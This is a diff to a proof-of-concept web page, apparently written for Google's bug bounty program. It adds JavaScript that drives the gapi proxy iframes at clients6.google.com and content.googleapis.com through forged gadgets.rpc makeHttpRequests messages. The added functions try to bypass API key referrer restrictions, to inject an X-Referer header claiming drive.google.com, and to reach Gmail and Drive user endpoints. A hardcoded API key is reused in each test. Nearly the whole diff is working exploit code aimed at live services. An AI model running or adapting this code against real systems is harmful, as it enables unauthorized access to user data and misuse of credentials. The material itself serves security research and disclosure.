@@ -54,13 +54,20 @@ Both should return the same value. Paste YOUR value below (don't use the placeho
 <button onclick="runTest('3p-only')">Auth: SAPISID3PHASH (3P only)</button>
 <button onclick="runTest('clients6-origin')">Auth: SAPISID3PHASH + origin=clients6 (Referer hypothesis)</button>
 <button onclick="runTest('all')">Auth: All 3 variants</button>
-<button onclick="runPublicTest()">Public endpoints (NO auth needed)</button>
 <button onclick="runTest(true)">Baseline (no auth, expect 401-missing)</button>
+<br>
+<button onclick="runPublicTest()">Discovery + Certs (NO auth)</button>
+<button onclick="runApiKeyTest()">Drive/Books/YT with API key ONLY (no user auth)</button>
+<button onclick="runContentProxy()">content.googleapis.com proxy (Gmail test)</button>
+<button onclick="runRefererInjectTest()">Referer injection → X-Referer bypass</button>
 
 <p class="warn" style="font-size:0.9em">
 <b>SAPISID3PHASH 3P-only</b>: origin=majdch22.github.io (X-Origin set by proxy)<br>
 <b>clients6 origin</b>: tests if server uses HTTP Referer origin (https://clients6.google.com) instead of X-Origin<br>
-<b>Public endpoints</b>: /discovery/v1/apis, /oauth2/v1/certs — no auth at all, proves proxy routes correctly
+<b>Discovery</b>: /discovery/v1/apis → shows all APIs routed at clients6.google.com<br>
+<b>API key only</b>: public Drive/Books/YT without user auth — proxy XHR referer = clients6 URL → passes key restriction<br>
+<b>content proxy</b>: second proxy at content.googleapis.com — test Gmail path there<br>
+<b>Referer inject</b>: sends referer field in gadgets.rpc JSON → sets X-Referer on proxy XHR
 </p>
 
 <hr>
@@ -300,6 +307,202 @@ async function runTest(mode) {
   }, 15000);
 }
 
+// API-key-only test: Drive public files + Books + YouTube
+// No SAPISIDHASH, no user login. Uses API key only.
+// proxy XHR referer = https://clients6.google.com/static/proxy.html
+// → passes *.google.com API key referrer restriction automatically.
+async function runApiKeyTest() {
+  logEl.innerHTML = '';
+  document.getElementById('results').innerHTML = '';
+  const DRIVE_KEY = 'AIzaSyCN_sSPJMpYrAzC5AtTrltNC8oRmLtoqBk';
+  const rpcToken = 'key' + Math.random().toString(36).substr(2, 10);
+  const pageOrigin = location.origin;
+  log('ok', 'API-KEY-ONLY test (no user auth, no SAPISIDHASH)');
+  log('ok', 'Proxy XHR Referer = clients6.google.com/static/proxy.html → passes *.google.com key restriction');
+  log('warn', 'Drive public files: 200 = API key restriction bypassed. 403 unregistered callers = no public data without user.');
+
+  if (proxyIframe) proxyIframe.remove();
+  proxyIframe = document.createElement('iframe');
+  proxyIframe.style.cssText = 'display:none;width:1px;height:1px;';
+  proxyIframe.src = 'https://clients6.google.com/static/proxy.html?usegapi=1' +
+    '#parent=' + encodeURIComponent(pageOrigin) + '&rpctoken=' + rpcToken + '&origin=' + encodeURIComponent(pageOrigin);
+  document.body.appendChild(proxyIframe);
+
+  const requests = [
+    // Drive: public files listing (no user auth, api key only)
+    { key: 'drive-public', params: { url: '/drive/v3/files?key=' + DRIVE_KEY + '&q=visibility%3Dpublic&pageSize=5&fields=files(id,name,mimeType)', httpMethod: 'GET', headers: {}, body: null } },
+    // Drive About (no key scope needed for basic) — expect 401 without SAPISIDHASH
+    { key: 'drive-about-noauth', params: { url: '/drive/v3/about?key=' + DRIVE_KEY + '&fields=user', httpMethod: 'GET', headers: {}, body: null } },
+    // Books API (public, no user auth — needs key)
+    { key: 'books', params: { url: '/books/v1/volumes?q=security&key=' + DRIVE_KEY + '&maxResults=3', httpMethod: 'GET', headers: {}, body: null } },
+    // YouTube videos (public, no user auth — needs key)
+    { key: 'youtube', params: { url: '/youtube/v3/videos?id=dQw4w9WgXcQ&part=snippet&key=' + DRIVE_KEY, httpMethod: 'GET', headers: {}, body: null } },
+    // People API: public profile search (needs key, no user auth)
+    { key: 'people', params: { url: '/v1/people:searchDirectoryPeople?query=test&readMask=names&key=' + DRIVE_KEY, httpMethod: 'GET', headers: {}, body: null } }
+  ];
+
+  let keySent = false;
+  window.addEventListener('message', function keyHandler(e) {
+    if (e.source !== proxyIframe.contentWindow) return;
+    let msg; try { msg = JSON.parse(e.data); } catch(e) { return; }
+    if (!msg) return;
+    if (msg.s && msg.s.startsWith('ready:') && !keySent) {
+      keySent = true;
+      log('ok', 'Ready. Sending API-key-only batch...');
+      proxyIframe.contentWindow.postMessage(JSON.stringify({ s: 'makeHttpRequests', f: '..', c: 'key-1', a: [requests], t: rpcToken, l: null, g: true }), 'https://clients6.google.com');
+    }
+    if (msg.s !== '__cb') return;
+    log('ok', '__cb received');
+    let responseMap; try { responseMap = JSON.parse(msg.a[1]); } catch(e) { log('warn', 'parse fail'); return; }
+    Object.entries(responseMap).forEach(([key, wrapper]) => {
+      const status = wrapper.data && wrapper.data.status;
+      const bodyStr = wrapper.data && wrapper.data.body;
+      log(status === 200 ? 'crit' : 'warn', key + ' → HTTP ' + status + (status !== 200 ? ' — ' + String(bodyStr).substring(0, 120) : ''));
+      if (status === 200) {
+        let data; try { data = JSON.parse(bodyStr); } catch(e) { data = { raw: bodyStr }; }
+        const div = document.getElementById('results');
+        const block = document.createElement('div');
+        block.style = 'border:1px solid #00ff88;margin:8px 0;padding:10px;';
+        block.innerHTML = '<pre class="ok">✅ ' + key + ' HTTP 200 (API key only, no SAPISIDHASH):\n' + JSON.stringify(data, null, 2).substring(0, 2000) + '</pre>';
+        div.appendChild(block);
+        log('crit', '✅ ' + key + ': API key bypass CONFIRMED — no user auth needed!');
+      }
+    });
+    window.removeEventListener('message', keyHandler);
+  });
+  setTimeout(function() { if (!keySent) { keySent = true; log('warn', '5s fallback'); proxyIframe.contentWindow.postMessage(JSON.stringify({ s: 'makeHttpRequests', f: '..', c: 'key-1', a: [requests], t: rpcToken, l: null, g: true }), 'https://clients6.google.com'); } }, 5000);
+}
+
+// content.googleapis.com proxy — identical architecture, second domain
+// Tests Gmail at a different route (content.googleapis.com/gmail/v1/...)
+async function runContentProxy() {
+  logEl.innerHTML = '';
+  document.getElementById('results').innerHTML = '';
+  const rpcToken = 'cnt' + Math.random().toString(36).substr(2, 10);
+  const pageOrigin = location.origin;
+  log('ok', 'content.googleapis.com proxy test (second proxy, separate VRP report)');
+  log('warn', 'Same makeHttpRequests mechanism, different domain — tests Gmail/Drive routing');
+
+  if (proxyIframe) proxyIframe.remove();
+  proxyIframe = document.createElement('iframe');
+  proxyIframe.style.cssText = 'display:none;width:1px;height:1px;';
+  // content.googleapis.com proxy
+  proxyIframe.src = 'https://content.googleapis.com/static/proxy.html?usegapi=1' +
+    '#parent=' + encodeURIComponent(pageOrigin) + '&rpctoken=' + rpcToken + '&origin=' + encodeURIComponent(pageOrigin);
+  document.body.appendChild(proxyIframe);
+
+  const DRIVE_KEY = 'AIzaSyCN_sSPJMpYrAzC5AtTrltNC8oRmLtoqBk';
+  const requests = [
+    // Gmail via content.googleapis.com (maybe different routing than clients6)
+    { key: 'cnt-gmail-profile', params: { url: '/gmail/v1/users/me/profile', httpMethod: 'GET', headers: {}, body: null } },
+    { key: 'cnt-drive-about', params: { url: '/drive/v3/about?key=' + DRIVE_KEY + '&fields=user', httpMethod: 'GET', headers: {}, body: null } },
+    // Discovery at content.googleapis.com — what APIs are here?
+    { key: 'cnt-discovery', params: { url: '/discovery/v1/apis', httpMethod: 'GET', headers: {}, body: null } }
+  ];
+
+  let cntSent = false;
+  window.addEventListener('message', function cntHandler(e) {
+    if (e.source !== proxyIframe.contentWindow) return;
+    let msg; try { msg = JSON.parse(e.data); } catch(e) { return; }
+    if (!msg) return;
+    if (msg.s && msg.s.startsWith('ready:') && !cntSent) {
+      cntSent = true;
+      log('ok', 'content.googleapis.com proxy ready. Sending requests...');
+      proxyIframe.contentWindow.postMessage(JSON.stringify({ s: 'makeHttpRequests', f: '..', c: 'cnt-1', a: [requests], t: rpcToken, l: null, g: true }), 'https://content.googleapis.com');
+    }
+    if (msg.s !== '__cb') return;
+    log('ok', '__cb from content.googleapis.com proxy');
+    let responseMap; try { responseMap = JSON.parse(msg.a[1]); } catch(e) { log('warn', 'parse fail'); return; }
+    Object.entries(responseMap).forEach(([key, wrapper]) => {
+      const status = wrapper.data && wrapper.data.status;
+      const bodyStr = wrapper.data && wrapper.data.body;
+      const displayStatus = status === 200 ? 'crit' : 'warn';
+      log(displayStatus, key + ' → HTTP ' + status);
+      if (status === 200) {
+        let data; try { data = JSON.parse(bodyStr); } catch(e) { data = { raw: bodyStr }; }
+        const div = document.getElementById('results');
+        const block = document.createElement('div');
+        block.style = 'border:1px solid #ff4444;margin:8px 0;padding:10px;';
+        // For discovery, show API names
+        let display = data;
+        if (data.items) { display = { apiCount: data.items.length, apis: data.items.map(a => a.name + ' v' + a.version).slice(0, 30) }; }
+        block.innerHTML = '<pre class="crit">✅ content.googleapis.com: ' + key + ' HTTP 200:\n' + JSON.stringify(display, null, 2).substring(0, 3000) + '</pre>';
+        div.appendChild(block);
+        if (key === 'cnt-gmail-profile') log('crit', '✅ Gmail CONFIRMED at content.googleapis.com! — ' + bodyStr.substring(0, 200));
+      } else {
+        log('warn', '  → ' + String(bodyStr).substring(0, 150));
+      }
+    });
+    window.removeEventListener('message', cntHandler);
+  });
+  setTimeout(function() { if (!cntSent) { cntSent = true; log('warn', '5s fallback'); proxyIframe.contentWindow.postMessage(JSON.stringify({ s: 'makeHttpRequests', f: '..', c: 'cnt-1', a: [requests], t: rpcToken, l: null, g: true }), 'https://content.googleapis.com'); } }, 5000);
+}
+
+// X-Referer injection test
+// gadgets.rpc message has a 'referer' field: this.referer = f.referer || ""
+// $h() sets X-Referer header to this value on the proxy XHR.
+// By injecting referer:"https://drive.google.com", X-Referer = "https://drive.google.com"
+// → bypasses API key HTTP referrer restrictions that block non-*.google.com origins
+async function runRefererInjectTest() {
+  logEl.innerHTML = '';
+  document.getElementById('results').innerHTML = '';
+  const DRIVE_KEY = 'AIzaSyCN_sSPJMpYrAzC5AtTrltNC8oRmLtoqBk';
+  const rpcToken = 'ref' + Math.random().toString(36).substr(2, 10);
+  const pageOrigin = location.origin;
+  log('ok', 'X-Referer injection test via referer field in gadgets.rpc JSON');
+  log('ok', 'Normal X-Referer = our page origin. With injection: X-Referer = https://drive.google.com');
+  log('warn', 'If API key has *.google.com restriction → injection makes it pass for requests we control');
+
+  if (proxyIframe) proxyIframe.remove();
+  proxyIframe = document.createElement('iframe');
+  proxyIframe.style.cssText = 'display:none;width:1px;height:1px;';
+  proxyIframe.src = 'https://clients6.google.com/static/proxy.html?usegapi=1' +
+    '#parent=' + encodeURIComponent(pageOrigin) + '&rpctoken=' + rpcToken + '&origin=' + encodeURIComponent(pageOrigin);
+  document.body.appendChild(proxyIframe);
+
+  const requests = [
+    { key: 'books-injected-referer', params: { url: '/books/v1/volumes?q=hacking&key=' + DRIVE_KEY + '&maxResults=3', httpMethod: 'GET', headers: {}, body: null } },
+    { key: 'youtube-injected-referer', params: { url: '/youtube/v3/videos?id=dQw4w9WgXcQ&part=snippet&key=' + DRIVE_KEY, httpMethod: 'GET', headers: {}, body: null } }
+  ];
+
+  let refSent = false;
+  window.addEventListener('message', function refHandler(e) {
+    if (e.source !== proxyIframe.contentWindow) return;
+    let msg; try { msg = JSON.parse(e.data); } catch(e) { return; }
+    if (!msg) return;
+    if (msg.s && msg.s.startsWith('ready:') && !refSent) {
+      refSent = true;
+      log('ok', 'Ready. Sending makeHttpRequests with referer:"https://drive.google.com" injected...');
+      // KEY: add referer field to the gadgets.rpc message → $h() sets X-Referer: https://drive.google.com
+      proxyIframe.contentWindow.postMessage(JSON.stringify({
+        s: 'makeHttpRequests', f: '..', c: 'ref-1', a: [requests], t: rpcToken,
+        l: null, g: true,
+        referer: 'https://drive.google.com'  // ← INJECTED: sets X-Referer on proxy XHR
+      }), 'https://clients6.google.com');
+      log('ok', 'Message sent with referer:"https://drive.google.com" field');
+    }
+    if (msg.s !== '__cb') return;
+    log('ok', '__cb received');
+    let responseMap; try { responseMap = JSON.parse(msg.a[1]); } catch(e) { log('warn', 'parse fail'); return; }
+    Object.entries(responseMap).forEach(([key, wrapper]) => {
+      const status = wrapper.data && wrapper.data.status;
+      const bodyStr = wrapper.data && wrapper.data.body;
+      log(status === 200 ? 'crit' : 'warn', key + ' → HTTP ' + status + (status !== 200 ? ' — ' + String(bodyStr).substring(0, 200) : ''));
+      if (status === 200) {
+        let data; try { data = JSON.parse(bodyStr); } catch(e) { data = { raw: bodyStr }; }
+        const div = document.getElementById('results');
+        const block = document.createElement('div');
+        block.style = 'border:2px solid #ff4444;margin:8px 0;padding:10px;';
+        block.innerHTML = '<pre class="crit">✅ REFERER INJECTION BYPASS! ' + key + ' HTTP 200:\n' + JSON.stringify(data, null, 2).substring(0, 2000) + '</pre>';
+        div.appendChild(block);
+        log('crit', '🎯 REFERER INJECTION CONFIRMED! Key restriction bypassed via X-Referer: https://drive.google.com');
+      }
+    });
+    window.removeEventListener('message', refHandler);
+  });
+  setTimeout(function() { if (!refSent) { refSent = true; log('warn', '5s fallback'); proxyIframe.contentWindow.postMessage(JSON.stringify({ s: 'makeHttpRequests', f: '..', c: 'ref-1', a: [requests], t: rpcToken, l: null, g: true, referer: 'https://drive.google.com' }), 'https://clients6.google.com'); } }, 5000);
+}
+
 // Public endpoint test — no auth required at all
 // Proves the proxy routes XHRs correctly end-to-end
 async function runPublicTest() {
@@ -361,11 +564,19 @@ async function runPublicTest() {
         log('crit', '✅ ' + key + ': proxy routing confirmed!');
         let data;
         try { data = JSON.parse(bodyStr); } catch(e) { data = { raw: bodyStr.substring(0, 500) }; }
+        // For discovery, extract and display API names prominently
+        let displayData = data;
+        if (key === 'discovery' && data.items) {
+          const apiNames = data.items.map(a => a.name + ' v' + a.version + (a.preferred ? ' [preferred]' : ''));
+          displayData = { totalApis: data.items.length, apis: apiNames };
+          log('crit', '✅ Discovery: ' + data.items.length + ' APIs listed at clients6.google.com');
+          data.items.forEach(a => log('data', '  ' + a.name + ' v' + a.version + ' — ' + (a.description || '').substring(0, 80)));
+        }
         const div = document.getElementById('results');
         const block = document.createElement('div');
         block.style = 'border:1px solid #00ff88;margin:8px 0;padding:10px;';
         block.innerHTML = '<pre class="ok">✅ ' + key + ' (HTTP 200) — proxy routes to clients6.google.com:\n' +
-          JSON.stringify(data, null, 2).substring(0, 1500) + '</pre>';
+          JSON.stringify(displayData, null, 2).substring(0, 8000) + '</pre>';
         div.appendChild(block);
       } else {
         log('warn', key + ': HTTP ' + status + ' — ' + String(bodyStr).substring(0, 200));
